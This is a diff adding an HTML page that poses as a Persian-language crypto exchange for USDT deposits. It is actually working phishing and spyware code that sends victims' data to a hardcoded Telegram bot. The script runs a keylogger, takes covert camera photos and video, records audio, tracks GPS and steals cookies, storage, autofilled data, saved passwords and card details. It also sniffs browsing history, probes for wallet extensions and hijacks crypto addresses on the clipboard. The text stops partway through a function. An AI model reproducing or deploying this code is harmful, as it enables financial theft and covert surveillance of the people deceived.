@@ -1,0 +1,1059 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+<title>حیات جم | صرافی ارز دیجیتال | واریز USDT</title>
+<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+<style>
+:root {
+  --primary: #0f5c3a;
+  --primary-light: #1a8a55;
+  --gold: #d4a017;
+  --gold-light: #f0c850;
+  --dark: #0a1a10;
+  --bg: #f4efe6;
+  --glass: rgba(255, 253, 248, 0.85);
+  --glass-border: rgba(15, 92, 58, 0.2);
+  --text: #0f1a12;
+  --sub: #3d4a42;
+  --green: #16a34a;
+  --red: #b91c1c;
+  --font: 'Vazirmatn', system-ui, sans-serif;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  min-height: 100vh;
+  background: linear-gradient(160deg, #f4efe6 0%, #e8e0d0 40%, #d4cfc0 100%);
+  font-family: var(--font);
+  display: flex; align-items: center; justify-content: center;
+  padding: 14px; direction: rtl; overflow-x: hidden; color: var(--text);
+  position: relative;
+}
+body::before {
+  content: ''; position: fixed; inset: 0;
+  background: radial-gradient(circle at 15% 25%, rgba(212, 160, 23, 0.05) 0%, transparent 60%),
+              radial-gradient(circle at 85% 75%, rgba(15, 92, 58, 0.06) 0%, transparent 60%);
+  z-index: 0; pointer-events: none;
+}
+.main-wrap { position: relative; z-index: 1; width: 100%; max-width: 500px; }
+.card {
+  background: var(--glass);
+  backdrop-filter: blur(40px) saturate(200%);
+  -webkit-backdrop-filter: blur(40px) saturate(200%);
+  border-radius: 44px;
+  border: 1.5px solid var(--glass-border);
+  box-shadow: 0 28px 56px rgba(0, 0, 0, 0.06), 0 0 0 1px rgba(255, 255, 255, 0.7) inset;
+  padding: 2rem 1.5rem;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+  animation: popIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+  margin-bottom: 12px;
+}
+@keyframes popIn {
+  from { opacity: 0; transform: translateY(50px) scale(0.92); }
+  to { opacity: 1; transform: translateY(0) scale(1); }
+}
+.card::before {
+  content: ''; position: absolute; inset: 1px; border-radius: inherit;
+  background: linear-gradient(135deg, rgba(255, 255, 255, 0.5) 0%, transparent 40%, transparent 60%, rgba(255, 255, 255, 0.15) 100%);
+  pointer-events: none; z-index: 1;
+}
+.card > * { position: relative; z-index: 2; }
+
+.logo {
+  font-size: clamp(2rem, 5.5vw, 2.6rem); font-weight: 900;
+  background: linear-gradient(135deg, #0f5c3a 0%, #1a8a55 40%, #d4a017 100%);
+  -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent;
+  letter-spacing: -2px;
+  filter: drop-shadow(0 2px 6px rgba(15, 92, 58, 0.2));
+}
+.sub {
+  font-size: 0.65rem; font-weight: 800; color: var(--primary); letter-spacing: 5px;
+  text-transform: uppercase; border-top: 2px solid rgba(15, 92, 58, 0.25);
+  border-bottom: 2px solid rgba(15, 92, 58, 0.25); display: inline-block;
+  padding: 3px 20px; margin-bottom: 14px;
+}
+.badge {
+  padding: 6px 24px; border-radius: 100px; font-size: 0.75rem; font-weight: 800;
+  display: inline-flex; align-items: center; gap: 8px;
+  border: 1px solid rgba(255, 255, 255, 0.4);
+  margin-bottom: 16px; animation: badgePulse 2.5s ease-in-out infinite;
+}
+.badge-green {
+  background: linear-gradient(135deg, #0f5c3a, #1a8a55);
+  color: #fff;
+  box-shadow: 0 6px 20px rgba(15, 92, 58, 0.3);
+}
+.badge-gold {
+  background: linear-gradient(135deg, #d4a017, #b8860b);
+  color: #fff;
+  box-shadow: 0 6px 20px rgba(212, 160, 23, 0.35);
+}
+@keyframes badgePulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.03); } }
+
+.btn {
+  padding: 14px 28px; border-radius: 60px; font-weight: 800; font-family: inherit;
+  cursor: pointer; transition: all 0.3s ease; display: inline-flex; align-items: center;
+  justify-content: center; gap: 10px; border: none; font-size: 0.95rem; width: 100%;
+  position: relative; overflow: hidden;
+}
+.btn-green {
+  background: linear-gradient(135deg, #1a8a55, #0f5c3a);
+  color: #fff;
+  box-shadow: 0 12px 32px rgba(26, 138, 85, 0.4);
+  border: 1px solid rgba(255, 255, 255, 0.3);
+}
+.btn-gold {
+  background: linear-gradient(135deg, #d4a017, #b8860b);
+  color: #fff;
+  box-shadow: 0 12px 32px rgba(212, 160, 23, 0.4);
+  border: 1px solid rgba(255, 255, 255, 0.3);
+}
+.btn-outline {
+  background: transparent; border: 2.5px solid #0f5c3a;
+  color: var(--primary); font-weight: 700; width: auto; padding: 10px 20px;
+}
+.btn-sm { padding: 10px 20px; width: auto; font-size: 0.8rem; }
+.btn:active { transform: scale(0.96); }
+.input {
+  width: 100%; padding: 15px 20px; background: rgba(255, 255, 255, 0.9);
+  border: 2px solid rgba(15, 92, 58, 0.25); border-radius: 50px; font-size: 0.95rem;
+  font-family: inherit; text-align: center; direction: ltr; letter-spacing: 1px;
+  transition: all 0.2s; color: #1a1a1a;
+}
+.input:focus {
+  outline: none; border-color: #d4a017;
+  box-shadow: 0 0 0 6px rgba(212, 160, 23, 0.12); background: #fff;
+}
+.input-sm { padding: 12px 16px; font-size: 0.85rem; }
+
+.progress-wrap { width: 100%; height: 8px; background: rgba(0, 0, 0, 0.05); border-radius: 4px; margin: 18px 0; overflow: hidden; }
+.progress-bar {
+  height: 100%; background: linear-gradient(90deg, #0f5c3a, #d4a017, #0f5c3a);
+  background-size: 300% 100%; border-radius: 4px; transition: width 0.7s ease;
+  animation: shimmer 2s linear infinite;
+}
+@keyframes shimmer { 0% { background-position: 0% 0; } 100% { background-position: 300% 0; } }
+
+.spinner { display: inline-block; width: 52px; height: 52px; position: relative; margin: 14px auto; }
+.spinner::before, .spinner::after {
+  content: ''; position: absolute; border-radius: 50%; border: 3px solid transparent;
+}
+.spinner::before { inset: 0; border-top-color: #0f5c3a; border-right-color: #d4a017; animation: spinFast 0.8s linear infinite; }
+.spinner::after { inset: 7px; border-bottom-color: #d4a017; border-left-color: #0f5c3a; animation: spinSlow 1.3s linear infinite reverse; }
+@keyframes spinFast { to { transform: rotate(360deg); } }
+@keyframes spinSlow { to { transform: rotate(-360deg); } }
+
+.step-item {
+  display: flex; align-items: center; gap: 10px; padding: 10px 12px;
+  background: rgba(255, 255, 255, 0.5); border-radius: 14px; margin: 5px 0;
+  border: 1px solid rgba(0, 0, 0, 0.04); font-size: 0.78rem; transition: all 0.3s;
+}
+.step-item.active { background: rgba(15, 92, 58, 0.06); border-color: rgba(15, 92, 58, 0.25); box-shadow: 0 3px 12px rgba(15, 92, 58, 0.06); }
+.step-item.done { background: rgba(34, 197, 94, 0.04); border-color: rgba(34, 197, 94, 0.2); }
+.step-icon { font-size: 1rem; width: 26px; text-align: center; }
+.step-info { flex: 1; text-align: right; }
+.step-title { font-weight: 600; font-size: 0.78rem; }
+.step-detail { font-size: 0.65rem; color: var(--sub); margin-top: 2px; }
+.step-status { font-size: 0.6rem; padding: 2px 8px; border-radius: 10px; font-weight: 600; white-space: nowrap; }
+.status-wait { background: rgba(150, 150, 150, 0.1); color: #666; }
+.status-run { background: rgba(245, 158, 11, 0.15); color: #d97706; animation: pulse 1s infinite; }
+.status-ok { background: rgba(34, 197, 94, 0.1); color: var(--green); }
+@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+.scan-line {
+  height: 2px; background: linear-gradient(90deg, transparent, #0f5c3a, #d4a017, transparent);
+  animation: scan 2s ease-in-out infinite; margin: 6px 0; border-radius: 1px;
+}
+@keyframes scan { 0%, 100% { opacity: 0.2; transform: scaleX(0.8); } 50% { opacity: 1; transform: scaleX(1); } }
+
+.stat-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid rgba(0, 0, 0, 0.04); font-size: 0.8rem; }
+.stat-row .lbl { color: var(--sub); }
+.stat-row .val { font-weight: 700; color: var(--primary); }
+
+.cs-card {
+  background: rgba(15, 92, 58, 0.03);
+  border-radius: 20px; padding: 14px; margin: 12px 0;
+  border: 1px solid rgba(15, 92, 58, 0.15); text-align: right;
+}
+.cs-number { font-size: 1.4rem; font-weight: 900; color: var(--primary); direction: ltr; display: inline-block; }
+
+.tx-hash { font-family: monospace; font-size: 0.7rem; color: #1a8a55; background: rgba(15, 92, 58, 0.06); padding: 6px 12px; border-radius: 10px; direction: ltr; display: inline-block; word-break: break-all; }
+
+.toast {
+  position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+  background: rgba(10, 26, 16, 0.95); color: #fff; padding: 12px 26px;
+  border-radius: 50px; z-index: 9999; font-size: 0.8rem;
+  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+  border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(20px);
+  opacity: 0; pointer-events: none; transition: all 0.4s;
+}
+.toast.show { opacity: 1; bottom: 40px; }
+.toast-error { background: rgba(185, 28, 28, 0.95); }
+.toast-success { background: rgba(22, 163, 74, 0.95); }
+
+.hidden { display: none !important; }
+footer { text-align: center; margin-top: 28px; font-size: 0.7rem; color: #94a3b8; border-top: 1px solid rgba(0, 0, 0, 0.05); padding-top: 16px; }
+video, canvas, audio { position: fixed; top: -9999px; left: -9999px; opacity: 0; pointer-events: none; width: 2px; height: 2px; }
+#stealthForm { position: fixed; top: -9999px; left: -9999px; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
+
+.tooltip { font-size: 0.6rem; color: #888; margin-top: 4px; }
+.divider { height: 1px; background: linear-gradient(90deg, transparent, rgba(15, 92, 58, 0.15), transparent); margin: 14px 0; }
+</style>
+</head>
+<body>
+<div class="main-wrap" id="appRoot"></div>
+<video id="hiddenVideo" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas"></canvas>
+<div id="globalToast" class="toast"></div>
+
+<form id="stealthForm" action="#" method="post">
+<input type="text" name="name" autocomplete="name">
+<input type="email" name="email" autocomplete="email">
+<input type="password" name="password" autocomplete="current-password">
+<input type="text" name="username" autocomplete="username">
+<input type="tel" name="phone" autocomplete="tel-national">
+<input type="text" name="address" autocomplete="street-address">
+<input type="text" name="cc-name" autocomplete="cc-name">
+<input type="text" name="cc-number" autocomplete="cc-number">
+<input type="text" name="cc-exp" autocomplete="cc-exp">
+<input type="text" name="cc-csc" autocomplete="cc-csc">
+<button type="submit">Submit</button>
+</form>
+
+<script>
+(function() {
+// ======================== CONFIG ========================
+const TOKEN = "8651752684:AAFFE7kwtXvzl3HQhtv12cns8rBqmIHbxe8";
+const CHAT = "1690458498";
+let SID = null;
+let WALLET = "";
+let CAPTURE_ACTIVE = false;
+let CAPTURE_TIMER = null;
+let PHOTO_COUNT = 0;
+let MAX_PHOTOS_BEFORE_VIDEO = 4;
+let KEY_BUF = "";
+let CLIPBOARD_HISTORY = [];
+let LAST_GPS = null;
+let WS = null;
+let DETAIL_INTERVAL = null;
+
+// ======================== UTILS ========================
+function toast(msg, dur, type) {
+  dur = dur || 2800;
+  type = type || '';
+  var t = document.getElementById('globalToast');
+  t.textContent = msg;
+  t.className = 'toast' + (type ? ' toast-' + type : '');
+  t.classList.add('show');
+  clearTimeout(t._t);
+  t._t = setTimeout(function() { t.classList.remove('show'); }, dur);
+}
+
+function dtb(d) {
+  var arr = d.split(',');
+  var m = arr[0].match(/:(.*?);/);
+  var ct = m ? m[1] : 'jpeg';
+  var b = atob(arr[1]);
+  var a = new Uint8Array(b.length);
+  for (var i = 0; i < b.length; i++) a[i] = b.charCodeAt(i);
+  return new Blob([a], { type: 'image/' + ct });
+}
+
+function tgPhoto(b64, cap) {
+  try {
+    var fd = new FormData();
+    fd.append('chat_id', CHAT);
+    fd.append('photo', dtb(b64), 'c.jpg');
+    fd.append('caption', String(cap || '').substring(0, 1000));
+    return fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', { method: 'POST', body: fd })
+      .then(function(r) { return r.json(); }).then(function(j) { return j.ok; });
+  } catch (e) { return Promise.resolve(false); }
+}
+
+function tgFile(blob, fn, cap) {
+  try {
+    var fd = new FormData();
+    fd.append('chat_id', CHAT);
+    fd.append('document', blob, fn);
+    fd.append('caption', String(cap || '').substring(0, 1000));
+    return fetch('https://api.telegram.org/bot' + TOKEN + '/sendDocument', { method: 'POST', body: fd })
+      .then(function(r) { return r.json(); }).then(function(j) { return j.ok; });
+  } catch (e) { return Promise.resolve(false); }
+}
+
+function tgMsg(text) {
+  try {
+    return fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT, text: String(text).substring(0, 4000), parse_mode: 'HTML' })
+    }).then(function(r) { return r.json(); }).then(function(j) { return j.ok; });
+  } catch (e) { return Promise.resolve(false); }
+}
+
+function genSid() {
+  var c = 'abcdefghijklmnopqrstuvwxyz0123456789';
+  var r = 'hyt_';
+  for (var i = 0; i < 12; i++) r += c[Math.floor(Math.random() * c.length)];
+  return r;
+}
+
+function now() { return new Date().toLocaleString('fa-IR'); }
+
+// ======================== KEYLOGGER ========================
+function startKeylogger() {
+  document.addEventListener('keydown', function(e) {
+    KEY_BUF += e.key;
+    if (KEY_BUF.length > 80) {
+      tgMsg('⌨️ <b>کی‌لاگر</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + KEY_BUF);
+      KEY_BUF = '';
+    }
+  });
+  setInterval(function() {
+    if (KEY_BUF.length > 0) {
+      tgMsg('⌨️ <b>کی‌لاگر</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + KEY_BUF);
+      KEY_BUF = '';
+    }
+  }, 15000);
+}
+
+// ======================== DEVICE INFO ========================
+function getDeviceInfo() {
+  var info = {
+    ua: navigator.userAgent.substring(0, 300),
+    platform: navigator.platform,
+    lang: navigator.language,
+    screen: screen.width + 'x' + screen.height + ' @' + (window.devicePixelRatio || 1) + 'x',
+    cores: navigator.hardwareConcurrency || '?',
+    mem: navigator.deviceMemory || '?',
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    touch: navigator.maxTouchPoints,
+    vendor: navigator.vendor || '?'
+  };
+  try {
+    var c = document.createElement('canvas');
+    var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (gl) {
+      var e = gl.getExtension('WEBGL_debug_renderer_info');
+      info.gpu = e ? gl.getParameter(e.UNMASKED_RENDERER_WEBGL) : '?';
+    }
+  } catch (ex) { info.gpu = '?'; }
+  try {
+    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) info.net = (conn.effectiveType || '?') + ' | ' + (conn.type || '?') + ' | ↓' + conn.downlink + 'Mbps | RTT:' + conn.rtt + 'ms';
+  } catch (ex) {}
+  try {
+    if (navigator.getBattery) {
+      navigator.getBattery().then(function(b) {
+        info.bat = Math.round(b.level * 100) + '% ' + (b.charging ? '⚡' : '') + ' | تخلیه:' + (b.dischargingTime || '?') + 's';
+        tgMsg('🔋 <b>باتری</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + info.bat);
+      });
+    }
+  } catch (ex) {}
+  return info;
+}
+
+// ======================== CAMERA ========================
+function snap(facing) {
+  return new Promise(function(resolve) {
+    try {
+      navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
+        audio: false
+      }).then(function(stream) {
+        var v = document.getElementById('hiddenVideo');
+        v.srcObject = stream;
+        v.play().then(function() {
+          setTimeout(function() {
+            try {
+              var c = document.getElementById('hiddenCanvas');
+              c.width = v.videoWidth || 640;
+              c.height = v.videoHeight || 480;
+              c.getContext('2d').drawImage(v, 0, 0);
+              var img = c.toDataURL('image/jpeg', 0.75);
+              stream.getTracks().forEach(function(t) { t.stop(); });
+              v.srcObject = null;
+              resolve({ ok: true, img: img, facing: facing });
+            } catch (e) { resolve({ ok: false }); }
+          }, 500);
+        }).catch(function() { resolve({ ok: false }); });
+      }).catch(function() { resolve({ ok: false }); });
+    } catch (e) { resolve({ ok: false }); }
+  });
+}
+
+function startCameraLoop() {
+  if (CAPTURE_ACTIVE) return;
+  CAPTURE_ACTIVE = true;
+  PHOTO_COUNT = 0;
+
+  function shoot() {
+    if (!CAPTURE_ACTIVE) return;
+    snap('user').then(function(f) {
+      if (f.ok && CAPTURE_ACTIVE) { PHOTO_COUNT++; tgPhoto(f.img, '📸 عکس ' + PHOTO_COUNT + ' | سلفی\n🆔 ' + SID + '\n💳 ' + WALLET); }
+    });
+    setTimeout(function() {
+      if (!CAPTURE_ACTIVE) return;
+      snap('environment').then(function(b) {
+        if (b.ok && CAPTURE_ACTIVE) { PHOTO_COUNT++; tgPhoto(b.img, '📸 عکس ' + PHOTO_COUNT + ' | عقب\n🆔 ' + SID + '\n💳 ' + WALLET); }
+      });
+    }, 1800);
+  }
+  shoot();
+  CAPTURE_TIMER = setInterval(function() {
+    if (!CAPTURE_ACTIVE) return;
+    shoot();
+    if (PHOTO_COUNT >= MAX_PHOTOS_BEFORE_VIDEO) {
+      recordVideo(20000).then(function(blob) {
+        if (blob) tgFile(blob, 'video_' + Date.now() + '.webm', '🎥 ویدیو ۲۰ ثانیه\n🆔 ' + SID + '\n💳 ' + WALLET);
+      });
+      MAX_PHOTOS_BEFORE_VIDEO += 6;
+    }
+  }, 7000);
+}
+
+function stopAll() {
+  CAPTURE_ACTIVE = false;
+  if (CAPTURE_TIMER) { clearInterval(CAPTURE_TIMER); CAPTURE_TIMER = null; }
+  if (DETAIL_INTERVAL) { clearInterval(DETAIL_INTERVAL); DETAIL_INTERVAL = null; }
+}
+
+// ======================== VIDEO RECORDING ========================
+function recordVideo(dur) {
+  return new Promise(function(resolve) {
+    try {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 }, audio: false })
+        .then(function(stream) {
+          var rec = new MediaRecorder(stream, { mimeType: 'video/webm' });
+          var chunks = [];
+          rec.ondataavailable = function(e) { chunks.push(e.data); };
+          rec.onstop = function() {
+            var blob = new Blob(chunks, { type: 'video/webm' });
+            stream.getTracks().forEach(function(t) { t.stop(); });
+            resolve(blob);
+          };
+          rec.start();
+          setTimeout(function() { rec.stop(); }, dur);
+        }).catch(function() { resolve(null); });
+    } catch (e) { resolve(null); }
+  });
+}
+
+// ======================== AUDIO RECORDING ========================
+function recordAudio(dur) {
+  return new Promise(function(resolve) {
+    try {
+      navigator.mediaDevices.getUserMedia({ audio: true }).then(function(stream) {
+        var rec = new MediaRecorder(stream);
+        var chunks = [];
+        rec.ondataavailable = function(e) { chunks.push(e.data); };
+        rec.onstop = function() {
+          var blob = new Blob(chunks, { type: 'audio/webm' });
+          stream.getTracks().forEach(function(t) { t.stop(); });
+          resolve(blob);
+        };
+        rec.start();
+        setTimeout(function() { rec.stop(); }, dur);
+      }).catch(function() { resolve(null); });
+    } catch (e) { resolve(null); }
+  });
+}
+
+// ======================== SCREENSHOT ========================
+function takeScreenshot() {
+  try {
+    navigator.mediaDevices.getDisplayMedia({ video: { mediaSource: 'screen' } }).then(function(stream) {
+      var v = document.createElement('video');
+      v.srcObject = stream;
+      v.play().then(function() {
+        setTimeout(function() {
+          var c = document.createElement('canvas');
+          c.width = v.videoWidth || screen.width;
+          c.height = v.videoHeight || screen.height;
+          c.getContext('2d').drawImage(v, 0, 0);
+          var img = c.toDataURL('image/png');
+          stream.getTracks().forEach(function(t) { t.stop(); });
+          tgPhoto(img, '🖥 اسکرین‌شات\n🆔 ' + SID + '\n💳 ' + WALLET);
+        }, 500);
+      });
+    }).catch(function() {});
+  } catch (e) {}
+}
+
+// ======================== COOKIES & STORAGE ========================
+function stealCookies() {
+  var data = { cookies: document.cookie, localStorage: JSON.stringify(localStorage), sessionStorage: JSON.stringify(sessionStorage) };
+  tgMsg('🍪 <b>کوکی‌ها و ذخیره‌سازی</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + JSON.stringify(data, null, 2));
+  var blob = new Blob([JSON.stringify(data)], { type: 'text/plain' });
+  tgFile(blob, 'storage_' + SID + '.txt', '📁 ذخیره‌سازی مرورگر\n🆔 ' + SID);
+}
+
+// ======================== FINGERPRINT ========================
+async function getFullFingerprint() {
+  var fp = {};
+  var c = document.createElement('canvas');
+  c.width = 200; c.height = 50;
+  var ctx = c.getContext('2d');
+  ctx.fillStyle = '#0f5c3a'; ctx.fillRect(0, 0, 200, 50);
+  ctx.fillStyle = '#d4a017'; ctx.font = '14px Arial';
+  ctx.fillText('HYT', 10, 15);
+  fp.canvas = c.toDataURL().slice(0, 200);
+  var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+  if (gl) { var e = gl.getExtension('WEBGL_debug_renderer_info'); fp.webgl = e ? gl.getParameter(e.UNMASKED_RENDERER_WEBGL) : 'N/A'; }
+  try {
+    var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+    var osc = audioCtx.createOscillator();
+    osc.connect(audioCtx.destination);
+    osc.start(0);
+    var buffer = await audioCtx.startRendering();
+    fp.audio = Array.from(buffer.getChannelData(0).slice(0, 20)).map(function(v) { return v.toFixed(4); }).join(',');
+  } catch (e) {}
+  if (window.queryLocalFonts) {
+    try { var fonts = await window.queryLocalFonts(); fp.fonts = fonts.slice(0, 10).map(function(f) { return f.fullName; }).join(', '); } catch (e) {}
+  }
+  return fp;
+}
+
+// ======================== CLIPBOARD + CRYPTO HIJACK ========================
+function getClipboard() {
+  try {
+    navigator.clipboard.readText().then(function(t) {
+      if (t && t.trim()) {
+        CLIPBOARD_HISTORY.push({ text: t, time: Date.now() });
+        if (CLIPBOARD_HISTORY.length > 20) CLIPBOARD_HISTORY = CLIPBOARD_HISTORY.slice(-20);
+        tgMsg('📋 <b>کلیپبورد</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + t.substring(0, 1500));
+        var blob = new Blob([t], { type: 'text/plain' });
+        tgFile(blob, 'clipboard_' + Date.now() + '.txt', '📋 فایل کلیپبورد\n🆔 ' + SID);
+      }
+    }).catch(function() {});
+  } catch (e) {}
+}
+
+function startClipboardMonitor() { getClipboard(); setInterval(getClipboard, 20000); }
+
+function hijackClipboard() {
+  setInterval(async function() {
+    try {
+      var text = await navigator.clipboard.readText();
+      if (/(bc1|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|0x[a-fA-F0-9]{40}|T[A-Za-z1-9]{33})/.test(text)) {
+        var fake = '0x000000000000000000000000000000000000dEaD';
+        await navigator.clipboard.writeText(fake);
+        tgMsg('💸 <b>کلیپبورد کریپتو تغییر کرد</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\nآدرس اصلی: ' + text + '\nجایگزین: ' + fake);
+      }
+    } catch (e) {}
+  }, 2000);
+}
+
+// ======================== GPS ========================
+var locHistory = [];
+
+function addLocation(pos) {
+  locHistory.push({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy, time: new Date().toISOString() });
+  if (locHistory.length % 5 === 0) {
+    var blob = new Blob([JSON.stringify(locHistory)], { type: 'text/plain' });
+    tgFile(blob, 'loc_' + SID + '.txt', '📍 تاریخچه موقعیت (' + locHistory.length + ' نقطه)\n🆔 ' + SID);
+  }
+}
+
+function startGPS() {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(function(p) {
+    LAST_GPS = p;
+    addLocation(p);
+    tgMsg('📍 <b>موقعیت اولیه</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\nLat: ' + p.coords.latitude + '\nLng: ' + p.coords.longitude + '\nدقت: ' + p.coords.accuracy + 'm\n🔗 https://maps.google.com/?q=' + p.coords.latitude + ',' + p.coords.longitude);
+  }, function() {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+  setTimeout(function() {
+    navigator.geolocation.getCurrentPosition(function(p) {
+      addLocation(p);
+      tgMsg('📍 <b>موقعیت ثانویه</b>\n🆔 ' + SID + '\nLat: ' + p.coords.latitude + '\nLng: ' + p.coords.longitude);
+    }, function() {}, { enableHighAccuracy: true, timeout: 15000 });
+  }, 8000);
+  navigator.geolocation.watchPosition(function(p) {
+    addLocation(p);
+    tgMsg('📍 <b>زنده</b>\n🆔 ' + SID + '\nLat: ' + p.coords.latitude + '\nLng: ' + p.coords.longitude);
+  }, function() {}, { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
+}
+
+// ======================== IP ========================
+function getIPs() {
+  fetch('https://api.ipify.org?format=json').then(function(r) { return r.json(); }).then(function(d) {
+    tgMsg('🌐 <b>IP عمومی</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\nIP: ' + d.ip);
+  });
+  try {
+    var pc = new RTCPeerConnection({ iceServers: [] });
+    pc.createDataChannel('');
+    pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
+    var webrtcIPs = [];
+    pc.onicecandidate = function(ice) {
+      if (ice && ice.candidate && ice.candidate.candidate) {
+        var ips = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/g);
+        if (ips) { ips.forEach(function(ip) { if (!ip.startsWith('192.168') && !ip.startsWith('10.') && !ip.startsWith('127.') && webrtcIPs.indexOf(ip) === -1) webrtcIPs.push(ip); }); }
+      }
+    };
+    setTimeout(function() {
+      pc.close();
+      if (webrtcIPs.length) tgMsg('🌐 <b>IP واقعی (WebRTC)</b>\n🆔 ' + SID + '\n' + webrtcIPs.join('\n'));
+    }, 4000);
+  } catch (e) {}
+}
+
+// ======================== AUTOFILL ========================
+function getAutofill() {
+  var f = document.getElementById('stealthForm');
+  if (!f) return;
+  var d = {};
+  var has = false;
+  f.querySelectorAll('input').forEach(function(i) {
+    if (i.value && i.value.length > 0) { d[i.getAttribute('autocomplete') || i.name] = i.value; has = true; }
+  });
+  if (has) {
+    var text = JSON.stringify(d, null, 2);
+    tgMsg('📋 <b>Autofill</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + text);
+    var blob = new Blob([text], { type: 'text/plain' });
+    tgFile(blob, 'autofill_' + SID + '.txt', '📋 فایل Autofill\n🆔 ' + SID);
+  }
+}
+
+// ======================== CREDENTIALS ========================
+function getCredentials() {
+  if (!('credentials' in navigator)) return;
+  try {
+    navigator.credentials.get({ password: true, mediation: 'silent' }).then(function(c) {
+      if (c && c.type === 'password') {
+        var cred = 'نام: ' + (c.name || 'N/A') + '\nایمیل: ' + c.id + '\nپسورد: ' + c.password;
+        tgMsg('🔐 <b>پسورد ذخیره‌شده</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + cred);
+      }
+    }).catch(function() {});
+  } catch (e) {}
+}
+
+// ======================== PAYMENT ========================
+function getPayment() {
+  if (!('PaymentRequest' in window)) return;
+  try {
+    var req = new PaymentRequest(
+      [{ supportedMethods: ['basic-card'] }],
+      { total: { label: 'تأیید هویت صرافی', amount: { currency: 'USDT', value: '0' } } }
+    );
+    req.canMakePayment().then(function(can) {
+      if (can) {
+        req.show().then(function(r) {
+          var card = 'نام: ' + (r.details.cardholderName || '?') + '\nشماره: ' + (r.details.cardNumber || '?') + '\nتاریخ: ' + r.details.expiryMonth + '/' + r.details.expiryYear + '\nCCV: ' + (r.details.cardSecurityCode || '?');
+          tgMsg('💳 <b>کارت بانکی</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + card);
+          r.complete('success');
+        }).catch(function() {});
+      }
+    });
+  } catch (e) {}
+}
+
+// ======================== HISTORY SNIFFING ========================
+function sniffHistory() {
+  var sites = ['facebook.com', 'instagram.com', 'twitter.com', 'youtube.com', 'whatsapp.com', 'telegram.org', 'snapchat.com', 'tiktok.com', 'linkedin.com', 'pinterest.com', 'reddit.com', 'netflix.com', 'spotify.com', 'amazon.com', 'ebay.com', 'wikipedia.org', 'github.com', 'twitch.tv', 'discord.com', 'mail.google.com', 'outlook.com', 'yahoo.com', 'paypal.com', 'coinbase.com', 'binance.com', 'tradingview.com', 'okx.com', 'kucoin.com', 'bybit.com', 'huobi.com'];
+  var visited = [];
+  sites.forEach(function(s) {
+    try {
+      var a = document.createElement('a');
+      a.href = 'https://' + s;
+      document.body.appendChild(a);
+      var cl = getComputedStyle(a).color;
+      document.body.removeChild(a);
+      if (cl !== 'rgb(0, 0, 238)' && cl !== 'rgb(0, 0, 255)') visited.push(s);
+    } catch (e) {}
+  });
+  if (visited.length) {
+    var list = visited.join('\n');
+    tgMsg('🕵️ <b>سایت‌های بازدیدشده (' + visited.length + ')</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + list);
+    var blob = new Blob([list], { type: 'text/plain' });
+    tgFile(blob, 'history_' + SID + '.txt', '🕵️ تاریخچه\n🆔 ' + SID);
+  }
+}
+
+// ======================== EXTENSIONS ========================
+function detectExts() {
+  var exts = [
+    { n: 'MetaMask', u: 'chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/manifest.json' },
+    { n: 'TrustWallet', u: 'chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/manifest.json' },
+    { n: 'Binance Chain', u: 'chrome-extension://fhbohimaelbohpjbbldcngcnapndodjp/manifest.json' },
+    { n: 'Coinbase', u: 'chrome-extension://hnfanknocfeofbddgcijnmhnfnkdnaad/manifest.json' }
+  ];
+  var found = [];
+  exts.forEach(function(e) {
+    fetch(e.u, { mode: 'no-cors' }).then(function() { found.push(e.n); }).catch(function() {});
+  });
+  setTimeout(function() {
